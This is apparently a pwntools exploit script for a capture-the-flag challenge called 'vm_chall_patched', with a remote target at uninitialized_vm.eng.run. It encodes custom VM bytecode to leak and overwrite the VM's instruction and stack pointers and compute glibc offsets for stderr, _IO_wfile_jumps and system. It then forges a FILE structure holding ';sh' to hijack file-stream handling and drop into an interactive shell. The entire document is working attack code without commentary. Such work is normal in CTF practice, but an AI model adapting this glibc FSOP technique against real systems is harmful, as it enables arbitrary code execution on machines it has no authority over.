#!/usr/bin/env python3

from pwn import *

exe = ELF("./vm_chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def jmp(offset):
    return b"\x45" + p8(offset)

def sub(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x44" + p8(a_reg) + p8(b_reg)

def add(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x43" + p8(a_reg) + p8(b_reg)

def shl(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x42" + p8(a_reg) + p8(b_reg)

def shr(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x41" + p8(a_reg) + p8(b_reg)

def not_op(reg):
    assert reg in range(0, 8)
    return b"\x40" + p8(reg)

def xor(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x39" + p8(a_reg) + p8(b_reg)

def or_op(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x38" + p8(a_reg) + p8(b_reg)

def and_op(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x37" + p8(a_reg) + p8(b_reg)

def copy(cpy_to, cpy_from, len):
    assert cpy_from in range(0, 8)
    assert cpy_to in range(0, 8)
    return b"\x36" + p8(cpy_to) + p8(cpy_from) + p16(len)

def deref(reg, ptr):
    assert reg in range(0, 8)
    return b"\x35" + p8(reg) + p64(ptr)

def mov(a_reg, b_reg):
    assert a_reg in range(0, 8)
    assert b_reg in range(0, 8)
    return b"\x34" + p8(a_reg) + p8(b_reg)

def pop(reg):
    assert reg in range(0, 8)
    return b"\x33" + p8(reg)

def push_reg(reg):
    assert reg in range(0, 8)
    return b"\x32" + p8(reg)

def push_val(val):
    return b"\x31" + p8(val)

def expand():
    return B"G"


def conn():
    if args.REMOTE:
        io = remote("uninitialized_vm.eng.run", 8227)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    bytecode = b""

    bytecode += expand()
    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)

    bytecode = b""
    for i in range(1, 0x40):
        bytecode += push_val(i)

    # dist in reg2
    bytecode += push_val(0x10)
    bytecode += pop(2)
    bytecode += push_val(0x8)
    bytecode += pop(3)
    bytecode += shl(2, 3)
    bytecode += push_val(0x70)
    bytecode += pop(3)
    bytecode += or_op(2, 3)
    # ip dist in reg3
    bytecode += push_val(48+8+3+4)
    bytecode += pop(3)

    # leak
    bytecode += push_val(0xff)
    bytecode += pop(1)
    bytecode += push_val(0xd0)
    bytecode += pop(0)
    bytecode += copy(0, 1, 0)

    # prepare for writeback
    bytecode += push_val(0xff)
    bytecode += pop(5)
    bytecode += push_val(0xd0)
    bytecode += pop(4)


    for _ in range(18):
        bytecode += pop(0)

    # ip
    bytecode += pop(6)
    # sp
    bytecode += pop(7)
    # # bp
    # bytecode += pop(6)

    bytecode += sub(7, 2)
    bytecode += push_reg(7)
    bytecode += add(6, 3)
    bytecode += push_reg(6)

    # writeback
    bytecode += copy(5, 4, 0)

    # continue...
    bytecode += pop(7)
    bytecode += expand()
    
    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)

    # fix stack pointer
    for _ in range(5):
        bytecode = b"G"
        io.sendlineafter(b"lEn", str(len(bytecode)).encode())
        io.sendafter(b"BYTECODE", bytecode)

        bytecode = b""
        for _ in range(0x60):
            bytecode += pop(0)
        bytecode += expand()

        io.sendlineafter(b"lEn", str(len(bytecode)).encode())
        io.sendafter(b"BYTECODE", bytecode)
    bytecode = b"G"
    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)

    bytecode = b""
    for _ in range(0x60-22-1-8-1):
        bytecode += pop(0)
    bytecode += expand()

    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)

    # part2...
    # libc in reg7
    bytecode = b""
    bytecode += push_val(0x1e)
    bytecode += pop(6)
    bytecode += push_val(16)
    bytecode += pop(5)
    bytecode += shl(6, 5)

    bytecode += push_val(0x6b)
    bytecode += pop(4)
    bytecode += push_val(8)
    bytecode += pop(5)
    bytecode += shl(4, 5)
    bytecode += or_op(6, 4)

    bytecode += push_val(0x20)
    bytecode += pop(4)
    bytecode += push_val(8)
    bytecode += or_op(6, 4)

    bytecode += sub(7, 6)
    bytecode += expand()

    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)

    bytecode = b""
    # stderr in reg6
    offset = 0x1e74e0 + 216
    byte3 = (offset & 0xff_00_00) >> 16
    byte2 = (offset & 0xff_00) >> 8
    byte1 = (offset & 0xff)

    bytecode += mov(6, 7)

    bytecode += push_val(byte3)
    bytecode += pop(0)
    bytecode += push_val(16)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(6, 0)

    bytecode += push_val(byte2)
    bytecode += pop(0)
    bytecode += push_val(8)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(6, 0)

    bytecode += push_val(byte1)
    bytecode += pop(0)
    bytecode += add(6, 0)


    # libc.symbol("_IO_2_1_stderr_") - 0x10
    # in reg2
    offset = 0x1e74e0 - 0x10
    byte3 = (offset & 0xff_00_00) >> 16
    byte2 = (offset & 0xff_00) >> 8
    byte1 = (offset & 0xff)

    bytecode += mov(2, 7)

    bytecode += push_val(byte3)
    bytecode += pop(0)
    bytecode += push_val(16)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(2, 0)

    bytecode += push_val(byte2)
    bytecode += pop(0)
    bytecode += push_val(8)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(2, 0)

    bytecode += push_val(byte1)
    bytecode += pop(0)
    bytecode += add(2, 0)

    # libc.symbol("_IO_wfile_jumps") + 0x18 - 0x58
    # in reg3
    offset = 0x1e51e8 + 0x18 - 0x58
    byte3 = (offset & 0xff_00_00) >> 16
    byte2 = (offset & 0xff_00) >> 8
    byte1 = (offset & 0xff)

    bytecode += mov(3, 7)

    bytecode += push_val(byte3)
    bytecode += pop(0)
    bytecode += push_val(16)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(3, 0)

    bytecode += push_val(byte2)
    bytecode += pop(0)
    bytecode += push_val(8)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(3, 0)

    bytecode += push_val(byte1)
    bytecode += pop(0)
    bytecode += add(3, 0)

    # libc.symbol("system")
    # in reg7
    offset = 0x53400
    byte3 = (offset & 0xff_00_00) >> 16
    byte2 = (offset & 0xff_00) >> 8
    byte1 = (offset & 0xff)

    bytecode += push_val(byte3)
    bytecode += pop(0)
    bytecode += push_val(16)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(7, 0)

    bytecode += push_val(byte2)
    bytecode += pop(0)
    bytecode += push_val(8)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += add(7, 0)

    bytecode += push_val(byte1)
    bytecode += pop(0)
    bytecode += add(7, 0)

    # p32(0xfbad0101) + b";sh\0"
    # 0x68 73 3b  fb ad 01 01
    bytecode += push_val(0)
    bytecode += pop(5)

    bytecode += push_val(1)
    bytecode += pop(0)
    bytecode += or_op(5, 0)
    bytecode += push_val(8)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += or_op(5, 0)

    bytecode += push_val(0xad)
    bytecode += pop(0)
    bytecode += push_val(16)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += or_op(5, 0)

    bytecode += push_val(0xfb)
    bytecode += pop(0)
    bytecode += push_val(24)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += or_op(5, 0)

    bytecode += push_val(0x3b)
    bytecode += pop(0)
    bytecode += push_val(32)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += or_op(5, 0)

    bytecode += push_val(0x73)
    bytecode += pop(0)
    bytecode += push_val(40)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += or_op(5, 0)

    bytecode += push_val(0x68)
    bytecode += pop(0)
    bytecode += push_val(48)
    bytecode += pop(1)
    bytecode += shl(0, 1)
    bytecode += or_op(5, 0)

    bytecode += expand()

    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)

    bytecode = b""

    # copy vm_state
    bytecode += push_val(0xff)
    bytecode += pop(1)
    bytecode += push_val(0xd0)
    bytecode += pop(0)
    bytecode += copy(0, 1, 0)

    # ip
    bytecode += pop(4)
    # sp
    bytecode += pop(0)
    # bp
    bytecode += pop(1)
    
    bytecode += add(1, 1)
    bytecode += push_reg(1)
    bytecode += push_reg(6)
    bytecode += push_val(50-15)
    bytecode += pop(0)
    bytecode += add(4, 0)
    bytecode += push_reg(4)

    bytecode += push_val(0xff)
    bytecode += pop(1)
    bytecode += push_val(0xd0)
    bytecode += pop(0)
    bytecode += copy(1, 0, 0)

    # FSOP
    bytecode += push_reg(3)
    bytecode += push_reg(2)

    bytecode += push_val(0)
    bytecode += push_val(1)
    
    for _ in range(3):
        bytecode += push_val(0)
    bytecode += push_reg(2)
    for _ in range(2):
        bytecode += push_val(0)
    bytecode += push_reg(2)
    for _ in range(5):
        bytecode += push_val(0)
    bytecode += push_reg(7)
    for _ in range(10):
        bytecode += push_val(0)
    bytecode += push_reg(5)

    bytecode += jmp(0xff)

    io.sendlineafter(b"lEn", str(len(bytecode)).encode())
    io.sendafter(b"BYTECODE", bytecode)
    
        
    
    io.interactive()


if __name__ == "__main__":
    main()
